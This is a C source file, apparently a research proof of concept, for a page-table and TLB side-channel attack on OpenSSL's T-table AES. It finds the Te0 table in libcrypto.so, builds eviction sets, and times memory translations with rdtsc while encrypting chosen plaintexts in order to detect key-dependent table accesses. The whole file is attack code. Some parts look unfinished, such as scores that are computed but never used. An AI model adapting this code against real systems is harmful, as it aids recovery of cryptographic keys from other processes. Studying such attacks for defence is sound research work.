#define _GNU_SOURCE 1
#include <unistd.h>
#include <sys/mman.h>

#include <ctype.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <openssl/aes.h>

#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>

#include <libelf.h>
#include <gelf.h>

#include "sc-attacks.h"

#define XBEGIN_INIT     (~0u)
#define KIB ((size_t)1024)
#define MIB (1024 * KIB)
#define ALIGN_UP(ptr, align) \
	((((uintptr_t)ptr) & (align - 1)) ? \
	 ((((uintptr_t)ptr) + (align - 1)) & ~(align - 1)) : \
	 ((uintptr_t)ptr))
#define ALIGN_DOWN(ptr, align) \
	((ptr) & ~(align - 1))

struct page_set tlb_set;

struct page_set {
	void **data;
	size_t alloc, len;
};

int shm_populate(const char *path, size_t size)
{
	char *page;
	int fd;

	if ((fd = shm_open(path, O_RDWR | O_CREAT | O_EXCL, 0777)) < 0)
		return 0;

	if (ftruncate(fd, size) < 0)
		goto err_unlink;

	if ((page = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		0)) == MAP_FAILED)
		goto err_unlink;

	memset(page, 0x5a, size);
	close(fd);

	return 0;

err_unlink:
	close(fd);
	shm_unlink(path);

	return -1;
}

int shm_open_or_create(const char *path, size_t size)
{
	int fd;

	if ((fd = shm_open(path, O_RDONLY, 0777)) >= 0)
		return fd;

	if (shm_populate(path, size) < 0)
		return -1;

	return shm_open(path, O_RDONLY, 0777);
}

int page_set_resize(struct page_set *set, size_t alloc)
{
	void *data;

	if (!set)
		return -1;

	if (!(data = realloc(set->data, alloc * sizeof *set->data)))
		return -1;

	set->data = data;
	set->alloc = alloc;

	return 0;
}

int page_set_init(struct page_set *set, size_t alloc)
{
	if (!set)
		return -1;

	set->data = NULL;
	set->len = 0;
	set->alloc = alloc;

	if (!alloc)
		return 0;

	return page_set_resize(set, alloc);
}

int page_set_push(struct page_set *set, void *line)
{
	if (!set)
		return -1;

	if (set->len >= set->alloc &&
		page_set_resize(set, set->alloc ? 2 * set->alloc: 64) < 0)
		return -1;

	set->data[set->len++] = line;

	return 0;
}

int build_tlb(struct page_set *tlb_set, const char *path, size_t nentries)
{
	char *area, *p;
	size_t i;
	int fd;

	if ((fd = shm_open_or_create(path, 4 * KIB)) < 0)
		return -1;

	if ((area = mmap(NULL, nentries * 4 * KIB, PROT_NONE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		goto err_close;

	page_set_init(tlb_set, nentries);

	p = area;

	for (i = 0; i < nentries; ++i) {
		if (mmap(p, 4 * KIB, PROT_READ, MAP_FIXED | MAP_SHARED, fd, 0) ==
			MAP_FAILED)
			goto err_unmap;

		page_set_push(tlb_set, p);
		p += 4 * KIB;
	}

	close(fd);

	return 0;

err_unmap:
	munmap(area, nentries * 4 * KIB);
err_close:
	close(fd);
	return -1;
}

void *page_set_remove(struct page_set *set, size_t index)
{
	void *line;

	if (!set || index > set->len)
		return NULL;

	line = set->data[index];

	if (index + 1 < set->len) {
		memmove(set->data + index, set->data + index + 1,
			(set->len - index - 1) * sizeof *set->data);
	}

	--set->len;

	return line;
}

int page_set_clear(struct page_set *set)
{
	if (!set)
		return -1;

	set->len = 0;

	return 0;
}

void page_set_remap(struct page_set *set, void *target)
{
	uintptr_t base;
	uintptr_t offset;
	size_t i;

	offset = ((uintptr_t)target & (4 * KIB - 1)) >> 6;

	for (i = 0; i < set->len; ++i) {
		base = ALIGN_DOWN((uintptr_t)set->data[i], 2 * MIB);
		base = base + (offset << 15);

		if (base == (uintptr_t)set->data[i])
			continue;

		set->data[i] = mremap(set->data[i], 4 * KIB, 4 * KIB, MREMAP_MAYMOVE | MREMAP_FIXED, (void *)base);
	}
}

int page_set_shuffle(struct page_set *set)
{
	size_t i, j;
	void *line;

	if (!set)
		return -1;

	if (set->len < 1)
		return 0;

	for (i = set->len - 1; i < set->len; --i) {
		j = (size_t)(lrand48() % (i + 1));

		line = set->data[i];
		set->data[i] = set->data[j];
		set->data[j] = line;
	}

	return 0;
}

void *build_wset(struct page_set *pool, struct page_set *wset,
	struct page_set *tlb_set, void *target,
	int (* evicts)(struct page_set *, struct page_set *, void *))
{
	void *line = NULL;
	size_t i;

	if (!target) {
		i = (size_t)(lrand48() % pool->len);
		target = page_set_remove(pool, i);
	}

	while (pool->len) {
		i = (size_t)(lrand48() % pool->len);

		line = page_set_remove(pool, i);
		page_set_push(wset, line);
		page_set_shuffle(wset);

		if (evicts(wset, tlb_set, target))
			break;
	}

	return target;
}

void optimise_wset(struct page_set *pool, struct page_set *wset,
	struct page_set *tlb_set, void *target,
	int (*evicts)(struct page_set *, struct page_set *, void *))
{
	struct cache_line *line;
	size_t i;

	for (i = wset->len - 1; i < wset->len; --i) {
		line = page_set_remove(wset, i);

		if (evicts(wset, tlb_set, target)) {
			page_set_push(pool, line);
		} else {
			page_set_push(wset, line);
		}
	}
}

int validate_wset(struct page_set *wset, struct page_set *tlb_set,
	void *target,
	int (* evicts)(struct page_set *, struct page_set *, void *))
{
	size_t i;
	size_t score = 0;

	for (i = 0; i < 64; ++i) {
		if (evicts(wset, tlb_set, target))
			++score;
	}

	return score > 48;
}


void *find_wset(struct page_set *pool, struct page_set *wset,
	struct page_set *tlb_set, void *target, size_t nways,
	int (* evicts)(struct page_set *, struct page_set *, void *))
{
	if (!pool || !wset)
		return NULL;

	page_set_clear(wset);

	do {
		page_set_shuffle(pool);
		target = build_wset(pool, wset, tlb_set, target, evicts);

		if (wset->len < nways)
			continue;

		optimise_wset(pool, wset, tlb_set, target, evicts);
	} while (wset->len != nways || !validate_wset(wset, tlb_set, target, evicts));

	return target;
}

int limit_wset(struct page_set *lines, struct page_set *wset, size_t nways)
{
	void *line;

	while (wset->len > nways) {
		line = page_set_remove(wset, wset->len - 1);
		page_set_push(lines, line);
	}

	return 0;
}


static inline unsigned xbegin(void)
{
	uint32_t ret = XBEGIN_INIT;

	asm volatile(
		"xbegin 1f\n"
		"1:\n"
		: "+a" (ret)
		:: "memory");

	return ret;
}

static inline void xend(void)
{
	asm volatile(
		"xend\n"
		::: "memory");
}

int cmp_u64(const void *lhs, const void *rhs)
{
	return memcmp(lhs, rhs, sizeof(uint64_t));
}

void qsort_u64(uint64_t *base, size_t len)
{
	qsort(base, len, sizeof *base, cmp_u64);
}

static inline uint64_t rdtsc(void)
{
	uint64_t lo, hi;

	asm volatile("rdtscp\n"
		: "=a" (lo), "=d" (hi)
		:: "%rcx");

	lo |= (hi << 32);

	return lo;
}

uint64_t xlate(struct page_set *working_set, struct page_set *tlb_set)
{
	uint64_t t0, dt = 0;
	size_t i;

	for (i = 0; i < tlb_set->len; ++i)
		*(volatile char *)tlb_set->data[i];

	t0 = rdtsc();

	for (i = 0; i < working_set->len; ++i)
		*(volatile char *)working_set->data[i];

	dt = rdtsc() - t0;

	for (i = working_set->len - 1; i < working_set->len; --i)
		*(volatile char *)working_set->data[i];

	for (i = 0; i < working_set->len; ++i)
		*(volatile char *)working_set->data[i];

	for (i = working_set->len - 1; i < working_set->len; --i)
		*(volatile char *)working_set->data[i];

	return dt;
}



int xlate_and_probe(struct page_set *working_set, struct page_set *tlb_set,
	void *line)
{
	uint64_t times[16];
	uint64_t t0, dt;
	size_t i;

	for (i = 0; i < 16; ++i) {
		*(volatile char *)line;
		xlate(working_set, tlb_set);

		t0 = rdtsc();
		*(volatile char *)line;
		dt = rdtsc() - t0;

		times[i] = dt;
	}

	qsort_u64(times, 16);

	return times[16 / 2] > 150;
}

int build_ptable_pool(struct page_set *pool, const char *path, size_t npages)
{
	char *area, *p;
	size_t i, size;
	int fd;

	if ((fd = shm_open_or_create(path, 4 * KIB)) < 0)
		return -1;

	if ((area = mmap(NULL, (npages + 1) * 2 * MIB, PROT_NONE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_NORESERVE, -1, 0)) == MAP_FAILED)
		goto err_close;

	page_set_init(pool, npages);

	p = (void *)ALIGN_UP((uintptr_t)area, 2 * MIB);
	size = p - area;

	if (size)
		munmap(area, size);

	area = p;
	p = area + npages * 2 * MIB;
	size = 2 * MIB - size;

	if (size)
		munmap(p, size);

	p = area;

	for (i = 0; i < npages; ++i) {
		if (mmap(p, 4 * KIB, PROT_READ, MAP_FIXED | MAP_SHARED, fd, 0) ==
			MAP_FAILED)
			goto err_unmap;

		munmap(p + 4 * KIB, 2 * MIB - 4 * KIB);

		page_set_push(pool, p);
		p += 2 * MIB;
	}

	close(fd);

	return 0;

err_unmap:
	munmap(area, npages * 2 * MIB);
err_close:
	close(fd);
	return -1;
}

int stricmp(const char *lhs, const char *rhs)
{
	while (tolower(*lhs) == tolower(*rhs)) {
		if (*lhs == '\0')
			break;

		++lhs;
		++rhs;
	}

	return (int)tolower(*lhs) - (int)tolower(*rhs);
}

int gelf_find_sym(GElf_Sym *ret, Elf *elf, const char *key)
{
	Elf_Scn *scn = NULL;
	GElf_Shdr shdr;
	GElf_Sym sym;
	Elf_Data *data;
	const char *name;
	size_t i, count;

	while ((scn = elf_nextscn(elf, scn)) != NULL) {
		gelf_getshdr(scn, &shdr);

		if (shdr.sh_type != SHT_SYMTAB)
			continue;

		data = elf_getdata(scn, NULL);
		count = shdr.sh_size / shdr.sh_entsize;

		for (i = 0; i < count; ++i) {
			gelf_getsym(data, i, &sym);
			name = elf_strptr(elf, shdr.sh_link, sym.st_name);

			if (stricmp(name, key) != 0)
				continue;

			if (ret)
				*ret = sym;

			return 0;
		}
	}

	return -1;
}

void *gelf_find_sym_ptr(Elf *elf, const char *key)
{
	GElf_Sym sym;

	if (gelf_find_sym(&sym, elf, key) < 0)
		return NULL;

	return (void *)sym.st_value;
}

void *crypto_find_te0(int fd)
{
	Elf *elf;
	void *base;

	elf_version(EV_CURRENT);

	elf = elf_begin(fd, ELF_C_READ, NULL);

	if (!(base = gelf_find_sym_ptr(elf, "Te0"))) {
		fprintf(stderr, "error: unable to find the 'Te0' symbol in "
			"libcrypto.so.\n\nPlease compile a version of OpenSSL with the "
			"T-table AES implementation enabled.\n");
		return NULL;
	}

	elf_end(elf);

	return base;
}

int cmp_size(const void *lhs, const void *rhs)
{
	return memcmp(lhs, rhs, sizeof(size_t));
}

char *alloc_huge_page(void)
{
	char *page, *offset;
	size_t size;

	if ((page = mmap(NULL, 4 * MIB, PROT_NONE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return NULL;

	offset = (char *)ALIGN_UP((uintptr_t)page, 2 * MIB);

	size = (size_t)(offset - page);
	munmap(page, size);

	size = (size_t)(4 * MIB - (uintptr_t)offset - 2 * MIB);
	//munmap(offset + 2 * MIB, size);

	return offset;
}

char *alloc_page(int fd)
{
	char *page;

	if (!(page = alloc_huge_page()))
		return NULL;

	mmap(page, 4 * KIB, PROT_READ | PROT_WRITE,
		MAP_FIXED | MAP_SHARED, fd, 0);
	munmap(page + 4 * KIB, 2 * MIB - 4 * KIB);

	return page;
}

unsigned char key_data[32] = { 0 };

unsigned char plain[16];
unsigned char cipher[128];
unsigned char restored[128];

void seed(void)
{
	struct timeval tv;

	gettimeofday(&tv, NULL);
	srand48(tv.tv_usec);
}

void execute_side_channel()
{
	AES_KEY key;
	uint64_t *timings;
	struct stat stat;
	struct page_set lines, wset;
	uint64_t dt;
	int fd;
	char *base;
	char *te0;
	char *cl;
	size_t size;
	size_t round;
	size_t i, j;
	size_t byte;
	size_t nways = 16;

	timings = malloc(1000000 * sizeof *timings);

	seed();

	if (!init_sc())
		return;

#ifndef ATTACK_TARGET
#error "You must specify the libcrypto.so path as ATTACK_TARGET param to make"
#endif

	if ((fd = open(ATTACK_TARGET, O_RDONLY)) < 0) {
		perror("open");
		return;
	}

	if (!(te0 = crypto_find_te0(fd)))
		return;

	if (fstat(fd, &stat) < 0) {
		fprintf(stderr, "error: unable to get the file size of libcrypto.so\n");
		return;
	}

	size = ALIGN_UP((size_t)stat.st_size, 4 * KIB);

	if ((base = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED) {
		fprintf(stderr, "error: unable to map libcrypto.so\n");
		return;
	}

	close(fd);

	build_ptable_pool(&lines, "/foo", 4096);
	build_tlb(&tlb_set, "/foo", 1600);
	AES_set_encrypt_key(key_data, 128, &key);

	page_set_init(&wset, 16);

	for (cl = base + (size_t)te0, j = 0; j < 16; ++j, cl += 64) {
		page_set_remap(&lines, cl);
		find_wset(&lines, &wset, &tlb_set, cl, nways, xlate_and_probe);
		limit_wset(&lines, &wset, nways);

		struct timespec past, now;
		double diff;

		clock_gettime(CLOCK_MONOTONIC, &past);

		for (byte = 0; byte < 256; byte += 16) {
			plain[0] = byte;
			int64_t score = 0;

			xlate(&wset, &tlb_set);

			for (round = 0; round < 1000000; ++round) {
				for (i = 1; i < 16; ++i) {
					plain[i] = rand() % 256;
				}

				AES_encrypt(plain, cipher, &key);
				sched_yield();

				page_set_shuffle(&wset);
				dt = xlate(&wset, &tlb_set);

				if (dt < 450)
					--score;

				if (dt > 650)
					++score;
			}

			fflush(stdout);
		}

		clock_gettime(CLOCK_MONOTONIC, &now);

		diff = now.tv_sec + now.tv_nsec * .000000001;
		diff -= past.tv_sec + past.tv_nsec * .000000001;

		for (i = 0; i < wset.len; ++i) {
			page_set_push(&lines, wset.data[i]);
		}

	}

	close(fd);
	shm_unlink("/foo");

	return;
}